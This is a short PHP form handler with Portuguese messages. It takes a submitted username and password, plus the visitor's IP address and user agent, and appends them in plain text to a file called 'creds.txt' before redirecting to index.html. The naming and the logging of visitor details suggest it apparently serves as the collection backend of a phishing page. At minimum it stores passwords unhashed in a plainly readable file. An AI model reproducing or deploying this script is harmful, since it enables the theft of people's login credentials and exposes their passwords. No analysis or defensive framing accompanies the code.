<?php
$username = $_POST['username'];
$password = $_POST['password'];
$password2 = $_POST['password2'];
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];

$file = 'creds.txt';

if ($password !== $password2) {
    echo "As senhas não correspondem!<br>";
    echo "Redirecionando...";
    header("refresh:3;url=index.html");
    exit();
}

if (!file_exists($file)) {
    file_put_contents($file, "Registro de Credenciais\n", FILE_APPEND);
}

$data = "Nome de Usuário: $username, Senha: $password, Confirmar Senha: $password2, IP: $ip, User-Agent: $agent\n";
file_put_contents($file, $data, FILE_APPEND);

echo "Registro bem-sucedido!<br>";
echo "Redirecionando...";
header("refresh:3;url=index.html");
?>
